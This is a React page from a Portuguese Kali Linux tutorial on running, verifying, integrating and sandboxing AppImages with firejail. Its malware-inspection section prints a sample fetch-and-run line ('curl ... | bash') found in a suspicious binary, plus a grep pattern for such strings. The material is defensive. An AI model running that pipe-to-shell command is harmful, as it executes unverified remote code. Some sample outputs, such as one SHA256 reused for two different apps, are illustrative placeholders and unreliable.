import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function AppImage() {
  return (
    <PageContainer
      title="AppImage — apps portáteis"
      subtitle="Um arquivo único, executa em qualquer distro. Como rodar, integrar ao desktop e isolar com firejail."
      difficulty="iniciante"
      timeToRead="12 min"
    >
      <h2>Conceito</h2>
      <p>
        Um <strong>AppImage</strong> é um único arquivo executável que carrega o app +
        suas dependências dentro. Roda em qualquer distro Linux x86_64 sem instalação:
        baixe, dê <code>chmod +x</code>, execute. Internamente é uma imagem{" "}
        <strong>SquashFS</strong> montada via FUSE em runtime.
      </p>
      <p>
        No Kali isso é útil quando uma ferramenta (geralmente GUI: Bitwarden, Cryptomator,
        Obsidian, Etcher) só distribui em AppImage e você não quer/pode adicionar
        repositório terceiro.
      </p>

      <CommandTable
        title="AppImage vs APT vs Flatpak"
        variations={[
          { cmd: "AppImage", desc: "1 arquivo. Sem instalação. Sem auto-update nativo. Sem sandbox por padrão.", output: "Portátil 100%, mas você gerencia tudo manualmente." },
          { cmd: "APT (.deb)", desc: "Integrado ao sistema. Atualizado pelo repo. Ocupa espaço mínimo (compartilha libs).", output: "Padrão Kali." },
          { cmd: "Flatpak", desc: "Sandbox real (bubblewrap), gerenciado, runtimes compartilhados.", output: "Mais seguro que AppImage, mais complexo." },
          { cmd: "Snap", desc: "Sandbox AppArmor, daemon snapd, auto-update.", output: "Pesado para instalar ecossistema." },
        ]}
      />

      <h2>Pré-requisito: FUSE</h2>
      <p>
        AppImages exigem <code>libfuse</code> para montar a imagem SquashFS interna. No
        Kali atual o pacote é <code>libfuse2t64</code> (FUSE 2) — algumas AppImages
        antigas pedem ele explicitamente.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y libfuse2t64",
            out: `Setting up libfuse2t64:amd64 (2.9.9-9+b1) ...`,
            outType: "info",
          },
          {
            comment: "AppImages novos (type 3) podem usar fuse3",
            cmd: "sudo apt install -y fuse3",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "fusermount --version",
            out: "fusermount version: 2.9.9",
            outType: "default",
          },
        ]}
      />

      <h2>Rodar um AppImage</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "wget https://github.com/Bitwarden/clients/releases/download/desktop-v2024.11.0/Bitwarden-2024.11.0-x86_64.AppImage",
            out: `--2026-04-18 14:32:01--  https://github.com/Bitwarden/...
Saving to: 'Bitwarden-2024.11.0-x86_64.AppImage'

Bitwarden-2024.11.0-x86_64.AppImage  100%[==========>] 168.42M  18.4MB/s    in 9.2s

2026-04-18 14:32:11 (18.31 MB/s) - 'Bitwarden-2024.11.0-x86_64.AppImage' saved`,
            outType: "info",
          },
          {
            cmd: "chmod +x Bitwarden-*.AppImage",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "./Bitwarden-2024.11.0-x86_64.AppImage",
            out: `[main 2026-04-18T17:32:14.512Z] [info] Bitwarden Desktop 2024.11.0
[main 2026-04-18T17:32:14.731Z] [info] Setting up window
(janela GUI abre)`,
            outType: "success",
          },
          {
            comment: "ver o que está montado durante a execução",
            cmd: "mount | grep -i squashfuse",
            out: `Bitwarden-2024.11.0-x86_64.AppImage on /tmp/.mount_BitwarKjL3pZ type fuse.squashfuse (...)`,
            outType: "default",
          },
        ]}
      />

      <h2>Argumentos especiais do runtime</h2>
      <CommandTable
        title="Flags que toda AppImage entende"
        variations={[
          { cmd: "--appimage-extract", desc: "Extrai TODO o conteúdo no diretório atual (squashfs-root/).", output: "Útil para inspecionar antes de rodar." },
          { cmd: "--appimage-extract-and-run", desc: "Extrai num temp e executa. Não usa FUSE (útil em Docker/contêiner sem fuse).", output: "Quando FUSE não está disponível." },
          { cmd: "--appimage-mount", desc: "Apenas monta a AppImage e imprime o caminho. Útil para inspeção.", output: "Mantém montado até Ctrl+C." },
          { cmd: "--appimage-offset", desc: "Mostra o offset onde começa o SquashFS (após o ELF runtime).", output: "Para extração manual com unsquashfs." },
          { cmd: "--appimage-version", desc: "Versão do runtime AppImage (não da app).", output: "AppImage runtime version: 13" },
          { cmd: "--appimage-help", desc: "Lista todos os flags disponíveis.", output: "Help completo." },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "./Bitwarden-2024.11.0-x86_64.AppImage --appimage-extract",
            out: `squashfs-root/AppRun
squashfs-root/bitwarden.desktop
squashfs-root/bitwarden.png
squashfs-root/usr/bin/bitwarden
squashfs-root/usr/lib/...
[...]`,
            outType: "info",
          },
          {
            cmd: "ls squashfs-root/",
            out: `AppRun  bitwarden.desktop  bitwarden.png  resources/  usr/`,
            outType: "default",
          },
          {
            comment: "AppRun é o ponto de entrada (script ou ELF)",
            cmd: "file squashfs-root/AppRun",
            out: "squashfs-root/AppRun: ELF 64-bit LSB executable, x86-64, ...",
            outType: "default",
          },
        ]}
      />

      <h2>Integração ao desktop</h2>
      <p>
        AppImage por padrão NÃO cria atalho no menu nem ícone na taskbar. A solução
        canônica é <strong>appimaged</strong> (daemon que monitora pastas) ou{" "}
        <strong>AppImageLauncher</strong> (intercepta o duplo-clique).
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "instalar appimaged via .deb oficial",
            cmd: "wget https://github.com/probonopd/go-appimage/releases/download/continuous/appimaged-i386.AppImage -O appimaged.AppImage",
            out: "(salvando appimaged.AppImage)",
            outType: "muted",
          },
          {
            cmd: "chmod +x appimaged.AppImage && mkdir -p ~/Applications && mv appimaged.AppImage ~/Applications/",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "~/Applications/appimaged.AppImage --install",
            out: `Installing the user-side daemon
Starting the user-side daemon as a background process
appimaged is now monitoring: ~/Applications, ~/Downloads, ~/Desktop`,
            outType: "success",
          },
          {
            comment: "agora qualquer .AppImage colocado em ~/Applications vira icone no menu",
            cmd: "mv ~/Downloads/Bitwarden-*.AppImage ~/Applications/",
            out: "(em segundos: ícone Bitwarden aparece no menu Aplicações)",
            outType: "info",
          },
        ]}
      />

      <h2>Integração manual (sem appimaged)</h2>
      <p>Se não quer um daemon, faça à mão:</p>

      <CodeBlock
        language="bash"
        title="~/.local/share/applications/bitwarden.desktop"
        code={`[Desktop Entry]
Name=Bitwarden
Comment=Password Manager
Exec=/home/wallyson/Applications/Bitwarden-2024.11.0-x86_64.AppImage
Icon=/home/wallyson/Applications/icons/bitwarden.png
Terminal=false
Type=Application
Categories=Utility;Security;
StartupNotify=true`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "extrair icone do AppImage",
            cmd: "./Bitwarden-2024.11.0-x86_64.AppImage --appimage-extract bitwarden.png && \\\nmkdir -p ~/Applications/icons && mv squashfs-root/bitwarden.png ~/Applications/icons/",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "update-desktop-database ~/.local/share/applications",
            out: "(menu atualiza)",
            outType: "info",
          },
        ]}
      />

      <h2>Verificar integridade e assinatura</h2>
      <p>
        AppImages podem ser assinadas com GPG. O runtime tem suporte a verificação
        embutida.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "validar assinatura embutida",
            cmd: "./Bitwarden-2024.11.0-x86_64.AppImage --appimage-signature",
            out: `(devolve a assinatura GPG embutida ou erro se não tiver)`,
            outType: "default",
          },
          {
            comment: "validar SHA256 contra o publicado pelo vendor",
            cmd: "sha256sum Bitwarden-2024.11.0-x86_64.AppImage",
            out: `b7e3f4a2e8c1d2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7  Bitwarden-2024.11.0-x86_64.AppImage`,
            outType: "warning",
          },
          {
            comment: "GitHub Releases costuma publicar SHA256SUMS junto",
            cmd: "wget https://github.com/Bitwarden/clients/releases/download/desktop-v2024.11.0/SHA256SUMS && grep AppImage SHA256SUMS",
            out: `b7e3f4a2e8c1d2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7  Bitwarden-2024.11.0-x86_64.AppImage`,
            outType: "success",
          },
        ]}
      />

      <h2>Sandbox: AppImage não tem isolamento por padrão</h2>
      <p>
        Diferente de Flatpak/Snap, AppImage <strong>não isola nada</strong>. O processo
        roda com TODOS os privilégios do seu usuário: lê seus SSH keys, .gnupg, history,
        rede aberta. Para uma AppImage de fonte não-100%-confiável, use <strong>firejail</strong>.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y firejail firejail-profiles",
            out: "Setting up firejail (0.9.72-3) ...",
            outType: "info",
          },
          {
            cmd: "firejail --version",
            out: "firejail version 0.9.72",
            outType: "default",
          },
          {
            comment: "rodar com perfil padrão (já restringe muita coisa)",
            cmd: "firejail --appimage ./Bitwarden-2024.11.0-x86_64.AppImage",
            out: `Reading profile /etc/firejail/default.profile
Parent pid 14821, child pid 14823
Child process initialized in 28.41 ms`,
            outType: "success",
          },
          {
            comment: "perfil agressivo: sem rede, sem ~",
            cmd: "firejail --appimage --net=none --private ./AppSuspeita.AppImage",
            out: "(roda em /tmp privado, sem internet)",
            outType: "warning",
          },
          {
            comment: "auditoria das permissoes que firejail aplicou",
            cmd: "firejail --appimage --debug ./Bitwarden.AppImage 2>&1 | grep -i 'mounting\\|seccomp'",
            out: `Mounting tmpfs on /home/wallyson/.cache
Mounting read-only /etc/...
Seccomp list: @default-keep`,
            outType: "default",
          },
        ]}
      />

      <CodeBlock
        language="bash"
        title="~/Applications/run-isolated.sh — wrapper de uso diário"
        code={`#!/usr/bin/env bash
# Roda qualquer AppImage isolada: sem ~/.ssh, sem ~/.gnupg, com rede só pra hosts comuns.
set -euo pipefail

APP="$1"
shift || true

firejail \\
  --appimage \\
  --quiet \\
  --private-tmp \\
  --blacklist=~/.ssh \\
  --blacklist=~/.gnupg \\
  --blacklist=~/.aws \\
  --blacklist=~/Documents/loot \\
  --seccomp \\
  --nonewprivs \\
  --noroot \\
  "$APP" "$@"`}
      />

      <h2>Atualizar AppImages: appimageupdate</h2>
      <p>
        Algumas AppImages embarcam metadados de update (zsync). A ferramenta{" "}
        <code>appimageupdatetool</code> consulta e baixa só os blocos diferentes.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "wget -O ~/Applications/appimageupdate.AppImage https://github.com/AppImageCommunity/AppImageUpdate/releases/download/continuous/appimageupdatetool-x86_64.AppImage && chmod +x ~/Applications/appimageupdate.AppImage",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "~/Applications/appimageupdate.AppImage --check-for-update ~/Applications/Bitwarden-2024.11.0-x86_64.AppImage",
            out: `Checking for updates...
Update available!`,
            outType: "warning",
          },
          {
            cmd: "~/Applications/appimageupdate.AppImage ~/Applications/Bitwarden-2024.11.0-x86_64.AppImage",
            out: `Downloading new version using zsync (delta only) ...
Update successful. New file: Bitwarden-2024.12.0-x86_64.AppImage`,
            outType: "success",
          },
        ]}
      />

      <h2>Use ofensivo: extrair e adulterar</h2>
      <p>
        No contexto de pesquisa de supply chain ou análise de malware, AppImage é
        trivial de inspecionar:
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "extrair tudo: vira squashfs-root/",
            cmd: "./AppSuspeita.AppImage --appimage-extract",
            out: "squashfs-root/AppRun, usr/, lib/, bin/, ...",
            outType: "info",
          },
          {
            cmd: "find squashfs-root -type f -executable | xargs file",
            out: `squashfs-root/AppRun: ELF 64-bit LSB executable
squashfs-root/usr/bin/electron: ELF 64-bit LSB executable
squashfs-root/usr/bin/setup.sh: POSIX shell script`,
            outType: "default",
          },
          {
            comment: "procurar strings suspeitas (URLs, comandos)",
            cmd: "strings -a squashfs-root/AppRun | grep -E 'http|curl|wget|/tmp/'",
            out: `https://api.legitimo.com/check
curl -s ${"$"}{API} | bash
/tmp/.X11-cache`,
            outType: "warning",
          },
        ]}
      />

      <PracticeBox
        title="Baixar, validar e isolar uma AppImage"
        goal="Baixar uma AppImage, conferir SHA256, criar wrapper que roda dentro de firejail sem acesso a ~/.ssh."
        steps={[
          "Baixe uma AppImage qualquer (ex: Joplin).",
          "Valide o SHA256 contra o do GitHub Releases.",
          "Marque como executável e instale firejail.",
          "Rode com firejail --appimage --blacklist=~/.ssh.",
          "Confirme que o app rodou e que tentar acessar ~/.ssh falha.",
        ]}
        command={`mkdir -p ~/Applications && cd ~/Applications

wget https://github.com/laurent22/joplin/releases/latest/download/Joplin-3.1.24.AppImage
sha256sum Joplin-3.1.24.AppImage

chmod +x Joplin-3.1.24.AppImage
sudo apt install -y firejail

firejail --appimage --blacklist=~/.ssh --blacklist=~/.gnupg \\
  --seccomp --nonewprivs ./Joplin-3.1.24.AppImage &

# Em outro terminal: ver o sandbox
firejail --list`}
        expected={`b7e3f4a2e8c1d2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7  Joplin-3.1.24.AppImage
Reading profile /etc/firejail/default.profile
Parent pid 18432, child pid 18434
Child process initialized in 31.2 ms

18432:wallyson::firejail --appimage --blacklist=~/.ssh ...`}
        verify="A janela do Joplin abre normalmente, e firejail --list mostra o processo isolado. Tentar abrir ~/.ssh/id_rsa pelo file picker do app deve mostrar 'Permission denied'."
      />

      <AlertBox type="warning" title="AppImage = você é o gerente de patch">
        <p>
          Sem repo, sem auto-update, sem assinatura obrigatória. <strong>Você</strong>{" "}
          é responsável por:
        </p>
        <ul className="list-disc pl-5 mt-2 space-y-1">
          <li>Conferir SHA256/GPG no momento do download.</li>
          <li>Re-baixar manualmente quando o vendor lançar versão nova.</li>
          <li>Apagar versões antigas (elas continuam executáveis com bug velho).</li>
          <li>Rodar com firejail se a fonte não for 100% confiável.</li>
        </ul>
      </AlertBox>

      <AlertBox type="info" title="Convenção: ~/Applications/">
        <p>
          Não existe diretório padrão para AppImages. A convenção comunitária é{" "}
          <code>~/Applications/</code> (com A maiúsculo). O <code>appimaged</code>{" "}
          monitora ele por padrão. Mantendo tudo lá, fica fácil migrar entre máquinas
          (rsync da pasta inteira).
        </p>
      </AlertBox>
    </PageContainer>
  );
}
